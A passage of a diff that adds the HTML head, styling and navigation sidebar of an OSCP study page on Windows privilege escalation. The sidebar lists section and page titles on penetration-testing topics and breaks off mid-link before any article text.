@@ -1,0 +1,1305 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="color-scheme" content="light"><title>Escalate privileges on Windows — OSCP Reference</title><meta name="description" content="Plain OSCP reference: commands, explanations, interpretation and next checks."><link rel="canonical" href="https://armaanleg3nd.github.io/oscp/notes/methods/windows-privesc/"><style>:root{color-scheme:light}html{color:#000;background:#fff;scroll-padding-top:1rem}body{margin:0;font:17px/1.5 Times New Roman,Times,serif}a,a:visited{color:#00e;text-decoration:underline}a:focus-visible,summary:focus-visible{outline-offset:3px;outline:2px solid #000}#reference-index{box-sizing:border-box;background:#fff;border-right:1px solid #888;width:19rem;padding:.75rem 1rem;position:fixed;inset:0 auto 0 0;overflow:auto}#reference-index>p:first-child{margin-top:0}nav{overflow-wrap:anywhere;font-size:15px;line-height:1.4}nav ul{margin:.35rem 0;padding-left:1.15rem}nav>ul{padding-left:1rem}nav li{margin:.3rem 0}nav summary{cursor:pointer}nav [aria-current=page]{font-weight:700}main{min-width:0;margin-left:19rem;padding:1rem 2rem 3rem}article{overflow-wrap:anywhere;min-width:0;max-width:85ch}h1{font-size:2em;line-height:1.15}h2{margin-top:1.7em;font-size:1.5em}h3{margin-top:1.5em;font-size:1.2em}h4,h5,h6{margin-top:1.3em;font-size:1em}pre,code{font-family:Courier New,Courier,monospace;font-size:.9em}pre{white-space:pre;overflow-wrap:normal;background:#f5f5f5;border:1px solid #aaa;padding:.7rem;overflow-x:auto}table{border-collapse:collapse;max-width:100%;margin:1rem 0;display:block;overflow-x:auto}th,td{vertical-align:top;text-align:left;border:1px solid #aaa;padding:.35rem .55rem}th{background:#eee}blockquote{border-left:2px solid #aaa;margin-left:0;padding-left:1rem}img,svg{max-width:100%;height:auto}article details{margin:1rem 0}article summary{cursor:pointer}.skip{z-index:2;background:#fff;padding:.5rem;position:fixed;top:0;left:-10000px}.skip:focus{left:0}@media (width<=700px){html{scroll-padding-top:calc(32dvh + 1rem)}#reference-index{z-index:1;border-bottom:1px solid #888;border-right:0;width:100%;height:32dvh;inset:0 0 auto}main{margin-left:0;padding:calc(32dvh + 1rem) 1rem 2rem}body{font-size:16px}}
+</style></head><body><a class="skip" href="#document">Skip to document</a><aside id="reference-index"><p><strong><a href="/oscp/">OSCP Reference</a></strong></p><nav aria-label="Reference index"><p><a href="/oscp/notes/ad-investigation/">AD Notes</a> · <a href="/oscp/notes/ad-investigation/quick-reference/">AD quick reference</a></p><details open><summary>On this page</summary><ul><li><a href="/oscp/notes/methods/windows-privesc/#first-pass-tools-and-findings">First pass: tools and findings</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#record-the-token-and-host-context">Record the token and host context</a></li><li><a href="/oscp/notes/methods/windows-privesc/#run-winpeas-early-and-save-its-report">Run winPEAS early and save its report</a></li><li><a href="/oscp/notes/methods/windows-privesc/#verify-the-specific-servicetask-route">Verify the specific service/task route</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#discovery-workflow">Discovery workflow</a></li><li><a href="/oscp/notes/methods/windows-privesc/#method-families">Method families</a></li><li><a href="/oscp/notes/methods/windows-privesc/#choose-a-method">Choose a method</a></li><li><a href="/oscp/notes/methods/windows-privesc/#establish-windows-token-host-and-process-context">Establish Windows token, host and process context</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#1-purpose-and-result">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#2-recognition-clues">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#find-the-clue-from-your-starting-access">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#3-prerequisites">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#4-discover-and-verify-prerequisites">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#5-why-it-works">5. Why it works</a></li><li><a href="/oscp/notes/methods/windows-privesc/#6-execute-and-choose-variants">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/windows-privesc/#7-worked-example--hypothetical">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/windows-privesc/#8-verify-the-result">8. Verify the result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#9-failure-and-fallback">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/windows-privesc/#10-next-transitions">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#prove-effective-file-registry-and-service-object-permissions">Prove effective file, registry and service-object permissions</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#1-purpose-and-result-1">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#2-recognition-clues-1">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#find-the-clue-from-your-starting-access-1">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#3-prerequisites-1">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#4-discover-and-verify-prerequisites-1">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#5-why-it-works-1">5. Why it works</a></li><li><a href="/oscp/notes/methods/windows-privesc/#6-execute-and-choose-variants-1">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/windows-privesc/#7-worked-example--hypothetical-1">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/windows-privesc/#8-verify-the-result-1">8. Verify the result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#9-failure-and-fallback-1">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/windows-privesc/#10-next-transitions-1">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#recover-windows-application-history-and-stored-credential-artifacts">Recover Windows application, history and stored-credential artifacts</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#1-purpose-and-result-2">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#2-recognition-clues-2">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#find-the-clue-from-your-starting-access-2">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#3-prerequisites-2">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#4-discover-and-verify-prerequisites-2">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#5-why-it-works-2">5. Why it works</a></li><li><a href="/oscp/notes/methods/windows-privesc/#6-execute-and-choose-variants-2">6. Execute and choose variants</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#stored-credentials-and-powershell-trails">Stored credentials and PowerShell trails</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#7-worked-example--hypothetical-2">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/windows-privesc/#8-verify-the-result-2">8. Verify the result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#9-failure-and-fallback-2">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/windows-privesc/#10-next-transitions-2">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#change-a-privileged-services-executable-configuration">Change a privileged service&#39;s executable configuration</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#1-purpose-and-result-3">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#2-recognition-clues-3">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#find-the-clue-from-your-starting-access-3">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#3-prerequisites-3">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#4-discover-and-verify-prerequisites-3">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#5-why-it-works-3">5. Why it works</a></li><li><a href="/oscp/notes/methods/windows-privesc/#6-execute-and-choose-variants-3">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/windows-privesc/#7-worked-example--hypothetical-3">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/windows-privesc/#8-verify-the-result-3">8. Verify the result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#9-failure-and-fallback-3">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/windows-privesc/#10-next-transitions-3">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#replace-a-privileged-service-binary-or-consumed-file">Replace a privileged service binary or consumed file</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#1-purpose-and-result-4">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#2-recognition-clues-4">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#find-the-clue-from-your-starting-access-4">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#3-prerequisites-4">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#4-discover-and-verify-prerequisites-4">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#5-why-it-works-4">5. Why it works</a></li><li><a href="/oscp/notes/methods/windows-privesc/#6-execute-and-choose-variants-4">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/windows-privesc/#7-worked-example--hypothetical-4">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/windows-privesc/#8-verify-the-result-4">8. Verify the result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#9-failure-and-fallback-4">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/windows-privesc/#10-next-transitions-4">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#exploit-an-unquoted-service-path-with-a-writable-earlier-prefix">Exploit an unquoted service path with a writable earlier prefix</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#1-purpose-and-result-5">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#2-recognition-clues-5">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#find-the-clue-from-your-starting-access-5">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#3-prerequisites-5">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#4-discover-and-verify-prerequisites-5">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#5-why-it-works-5">5. Why it works</a></li><li><a href="/oscp/notes/methods/windows-privesc/#6-execute-and-choose-variants-5">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/windows-privesc/#7-worked-example--hypothetical-5">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/windows-privesc/#8-verify-the-result-5">8. Verify the result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#9-failure-and-fallback-5">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/windows-privesc/#10-next-transitions-5">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#control-a-privileged-dll-helper-or-configuration-load">Control a privileged DLL, helper or configuration load</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#1-purpose-and-result-6">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#2-recognition-clues-6">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#find-the-clue-from-your-starting-access-6">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#3-prerequisites-6">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#4-discover-and-verify-prerequisites-6">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#5-why-it-works-6">5. Why it works</a></li><li><a href="/oscp/notes/methods/windows-privesc/#6-execute-and-choose-variants-6">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/windows-privesc/#7-worked-example--hypothetical-6">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/windows-privesc/#8-verify-the-result-6">8. Verify the result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#9-failure-and-fallback-6">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/windows-privesc/#10-next-transitions-6">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#control-scheduled-tasks-startup-files-or-autostart-consumers">Control scheduled tasks, startup files or autostart consumers</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#1-purpose-and-result-7">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#2-recognition-clues-7">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#find-the-clue-from-your-starting-access-7">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#3-prerequisites-7">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#4-discover-and-verify-prerequisites-7">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#5-why-it-works-7">5. Why it works</a></li><li><a href="/oscp/notes/methods/windows-privesc/#6-execute-and-choose-variants-7">6. Execute and choose variants</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#scheduled-tasks">Scheduled tasks</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#7-worked-example--hypothetical-7">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/windows-privesc/#8-verify-the-result-7">8. Verify the result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#9-failure-and-fallback-7">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/windows-privesc/#10-next-transitions-7">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#validate-elevated-installer-policy-and-administrative-token-context">Validate elevated installer policy and administrative-token context</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#1-purpose-and-result-8">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#2-recognition-clues-8">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#find-the-clue-from-your-starting-access-8">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#3-prerequisites-8">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#4-discover-and-verify-prerequisites-8">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#5-why-it-works-8">5. Why it works</a></li><li><a href="/oscp/notes/methods/windows-privesc/#6-execute-and-choose-variants-8">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/windows-privesc/#7-worked-example--hypothetical-8">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/windows-privesc/#8-verify-the-result-8">8. Verify the result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#9-failure-and-fallback-8">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/windows-privesc/#10-next-transitions-8">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#select-a-privilege-backed-impersonation-or-object-control-route">Select a privilege-backed impersonation or object-control route</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#1-purpose-and-result-9">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#2-recognition-clues-9">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#find-the-clue-from-your-starting-access-9">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#3-prerequisites-9">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#4-discover-and-verify-prerequisites-9">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#5-why-it-works-9">5. Why it works</a></li><li><a href="/oscp/notes/methods/windows-privesc/#6-execute-and-choose-variants-9">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/windows-privesc/#7-worked-example--hypothetical-9">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/windows-privesc/#8-verify-the-result-9">8. Verify the result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#9-failure-and-fallback-9">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/windows-privesc/#10-next-transitions-9">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#use-backup-privilege-to-obtain-protected-local-credential-material">Use backup privilege to obtain protected local credential material</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#1-purpose-and-result-10">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#2-recognition-clues-10">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#find-the-clue-from-your-starting-access-10">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#3-prerequisites-10">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#4-discover-and-verify-prerequisites-10">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#5-why-it-works-10">5. Why it works</a></li><li><a href="/oscp/notes/methods/windows-privesc/#6-execute-and-choose-variants-10">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/windows-privesc/#7-worked-example--hypothetical-10">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/windows-privesc/#8-verify-the-result-10">8. Verify the result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#9-failure-and-fallback-10">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/windows-privesc/#10-next-transitions-10">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#select-a-matching-application-driver-or-kernel-exploit">Select a matching application, driver or kernel exploit</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#1-purpose-and-result-11">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#2-recognition-clues-11">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#find-the-clue-from-your-starting-access-11">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#3-prerequisites-11">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#4-discover-and-verify-prerequisites-11">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#5-why-it-works-11">5. Why it works</a></li><li><a href="/oscp/notes/methods/windows-privesc/#6-execute-and-choose-variants-11">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/windows-privesc/#7-worked-example--hypothetical-11">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/windows-privesc/#8-verify-the-result-11">8. Verify the result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#9-failure-and-fallback-11">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/windows-privesc/#10-next-transitions-11">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#turn-automated-windows-findings-into-manually-verified-candidates">Turn automated Windows findings into manually verified candidates</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#1-purpose-and-result-12">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#2-recognition-clues-12">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/windows-privesc/#find-the-clue-from-your-starting-access-12">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#3-prerequisites-12">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#4-discover-and-verify-prerequisites-12">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/windows-privesc/#5-why-it-works-12">5. Why it works</a></li><li><a href="/oscp/notes/methods/windows-privesc/#6-execute-and-choose-variants-12">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/windows-privesc/#7-worked-example--hypothetical-12">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/windows-privesc/#8-verify-the-result-12">8. Verify the result</a></li><li><a href="/oscp/notes/methods/windows-privesc/#9-failure-and-fallback-12">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/windows-privesc/#10-next-transitions-12">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/windows-privesc/#sources-and-shared-concepts">Sources and shared concepts</a></li></ul></details><ul><li><details><summary>Operational procedures</summary><ul><li><details><summary><a href="/oscp/reference/01-discovery-scanning/">01 — Discovery and scanning</a></summary><ul><li><a href="/oscp/reference/01-discovery-scanning/01-path-and-host-discovery/">Path and Host Discovery</a></li><li><a href="/oscp/reference/01-discovery-scanning/02-tcp-scanning/">TCP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/03-service-identification/">Service Identification</a></li><li><a href="/oscp/reference/01-discovery-scanning/04-udp-scanning/">UDP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/05-results-and-next-actions/">Scan Results and Next Actions</a></li><li><a href="/oscp/reference/01-discovery-scanning/06-windows-network-checks/">Windows Network Checks</a></li><li><a href="/oscp/reference/01-discovery-scanning/07-scanner-alternatives/">Scanner Alternatives and Web Baseline Checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/02-service-enumeration/">02 — Service enumeration</a></summary><ul><li><a href="/oscp/reference/02-service-enumeration/01-ftp/">FTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/02-ssh/">SSH Enumeration and Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/03-smtp/">SMTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/04-dns/">DNS Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/05-nfs-rpc/">NFS and Unix RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/06-smb-rpc/">SMB and MS-RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/07-snmp/">SNMP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/08-databases/">Database Enumeration and Privilege Boundaries</a></li><li><a href="/oscp/reference/02-service-enumeration/09-windows-remote-access/">Windows Remote-Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/10-http-web-mapping/">HTTP and Web Application Mapping</a></li><li><a href="/oscp/reference/02-service-enumeration/11-ldap-kerberos/">LDAP and Kerberos Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/12-sip-irc/">SIP and IRC Triage</a></li><li><a href="/oscp/reference/02-service-enumeration/13-memcached-webdav/">Memcached and WebDAV</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/03-initial-access/">03 — Initial access</a></summary><ul><li><a href="/oscp/reference/03-initial-access/01-rdp-access/">RDP Access</a></li><li><a href="/oscp/reference/03-initial-access/02-web-file-handling/">Web File Read, Inclusion and Upload Paths</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/">Command and Manual SQL Injection</a></li><li><a href="/oscp/reference/03-initial-access/04-access-control-and-xss/">Web Access Control, API Logic and XSS</a></li><li><a href="/oscp/reference/03-initial-access/05-wordpress-and-ssrf/">WordPress and SSRF Paths</a></li><li><a href="/oscp/reference/03-initial-access/06-public-exploit-adaptation/">Public Exploit Selection and Adaptation</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/04-shells-transfers-credentials/">04 — Shells, transfers and credentials</a></summary><ul><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/">File Transfer</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/">Shells, Payloads and Session Repair</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/">Credential Classification, Cracking and Reuse</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/04-file-and-repository-hunting/">File and Repository Hunting</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/05-python-tool-environments/">Python Tool Environments</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/">Payload Execution Obstacles</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/05-local-privilege-escalation/">05 — Local privilege escalation</a></summary><ul><li><a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/">Linux Privilege Escalation</a></li><li><a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/">Windows Privilege Escalation</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/06-ad-lateral-movement/">06 — AD and lateral movement</a></summary><ul><li><a href="/oscp/reference/06-ad-lateral-movement/01-domain-mapping/">Active Directory Domain Mapping</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/">Windows and Domain Credential Access</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/">Kerberos and Identity Transitions</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/">Object Control, AD CS and Domain Compromise</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/05-lateral-movement/">Lateral Movement</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts/">Conditional AD infrastructure and trust checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/07-pivoting-tunneling/">07 — Pivoting and tunneling</a></summary><ul><li><a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/">Tunneling and Port Forwarding</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/08-evidence-reporting/">08 — Evidence and reporting</a></summary><ul><li><a href="/oscp/reference/08-evidence-reporting/01-attack-tracking-and-evidence/">Integrated Attack Tracking and Evidence</a></li></ul></details></li><li><a href="/oscp/reference/INDEX/">Complete operational task index</a></li></ul></details></li><li><details><summary><a href="/oscp/cheatsheets/">Cheatsheets</a></summary><ul><li><a href="/oscp/cheatsheets/active-directory/">Active Directory Cheatsheet</a></li><li><a href="/oscp/cheatsheets/ad-investigation/">AD Investigation — Where to Look and What Output Means</a></li><li><a href="/oscp/cheatsheets/credentials-cracking/">Credentials and Cracking Cheatsheet</a></li><li><a href="/oscp/cheatsheets/discovery-scanning/">Discovery and Scanning Cheatsheet</a></li><li><a href="/oscp/cheatsheets/evidence-reporting/">Integrated Attack and Reporting Cheatsheet</a></li><li><a href="/oscp/cheatsheets/linux-privesc/">Linux Privilege Escalation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/payload-execution/">Payload Execution Obstacles Cheatsheet</a></li><li><a href="/oscp/cheatsheets/pivoting/">Pivoting and Tunneling Cheatsheet</a></li><li><a href="/oscp/cheatsheets/public-exploits/">Public Exploit Adaptation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/service-opportunities/">Service Opportunity Cheatsheet</a></li><li><a href="/oscp/cheatsheets/shells-payloads/">Shells and Payloads Cheatsheet</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/">Tool Command Reference</a></li><li><a href="/oscp/cheatsheets/tool-selection/">Tool Selection Matrix</a></li><li><a href="/oscp/cheatsheets/tools-and-scripts/">Tools and scripts by task</a></li><li><a href="/oscp/cheatsheets/web-exploitation/">Web Exploitation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/web-mapping/">Web Mapping Cheatsheet</a></li><li><a href="/oscp/cheatsheets/windows-privesc/">Windows Privilege Escalation Cheatsheet</a></li></ul></details></li><li><details open><summary>Study notes</summary><ul><li><a href="/oscp/notes/Attack_Strategy_Map/">Attack Strategy Map</a></li><li><a href="/oscp/notes/GetSH_Coverage/">getSH Source Coverage</a></li><li><a href="/oscp/notes/Master_Notes/">Master Notes</a></li><li><a href="/oscp/notes/Recognition_Practice/">Recognition practice</a></li><li><a href="/oscp/notes/Speedrun_Breakdown/">Attack-first OSCP speedrun breakdown</a></li><li><details><summary><a href="/oscp/notes/ad-investigation/">AD Notes — focused checks</a></summary><ul><li><a href="/oscp/notes/ad-investigation/acl/">An ACL shows a powerful right — can I actually use it?</a></li><li><a href="/oscp/notes/ad-investigation/asrep/">Can this account produce AS-REP roasting material?</a></li><li><a href="/oscp/notes/ad-investigation/bloodhound/">How do I turn a BloodHound graph into a verified path?</a></li><li><a href="/oscp/notes/ad-investigation/conditional/">When should I investigate AD CS, delegation or GPOs?</a></li><li><a href="/oscp/notes/ad-investigation/context/">What identity and domain am I actually using?</a></li><li><a href="/oscp/notes/ad-investigation/credential-sources/">On a controlled host, where could useful credentials exist?</a></li><li><a href="/oscp/notes/ad-investigation/failure/">A command failed or returned nothing — what can I conclude?</a></li><li><a href="/oscp/notes/ad-investigation/files/">I found a script or configuration file — what matters?</a></li><li><a href="/oscp/notes/ad-investigation/hosts/">Which computers can this identity access?</a></li><li><a href="/oscp/notes/ad-investigation/kerberoast/">I found a service account — is Kerberoasting useful?</a></li><li><a href="/oscp/notes/ad-investigation/managed/">Can I read a LAPS or gMSA secret?</a></li><li><a href="/oscp/notes/ad-investigation/material/">I found a secret — what kind is it and where can I use it?</a></li><li><a href="/oscp/notes/ad-investigation/movement/">I have credentials — which remote-access method fits?</a></li><li><a href="/oscp/notes/ad-investigation/object-change/">Which identity change follows from a validated object right?</a></li><li><a href="/oscp/notes/ad-investigation/policy/">How do I interpret password policy before testing credentials?</a></li><li><a href="/oscp/notes/ad-investigation/quick-reference/">AD — Quick Reference</a></li><li><a href="/oscp/notes/ad-investigation/read-output/">How to read command output</a></li><li><a href="/oscp/notes/ad-investigation/reenumerate/">I gained a new account or host — what do I check again?</a></li><li><a href="/oscp/notes/ad-investigation/replication/">Does this identity really have DCSync rights?</a></li><li><a href="/oscp/notes/ad-investigation/routes/">Is this an access failure or a missing route?</a></li><li><a href="/oscp/notes/ad-investigation/secure-baseline/">Expected behavior or useful weakness?</a></li><li><a href="/oscp/notes/ad-investigation/sessions/">A privileged user has a session — what does that mean?</a></li><li><a href="/oscp/notes/ad-investigation/shares/">Which shares and files should I inspect first?</a></li><li><a href="/oscp/notes/ad-investigation/smb-wmi/">SMB or WMI execution — what must be true first?</a></li><li><a href="/oscp/notes/ad-investigation/spns/">What does an SPN tell me to investigate?</a></li><li><a href="/oscp/notes/ad-investigation/tickets/">What does this Kerberos ticket actually allow?</a></li><li><a 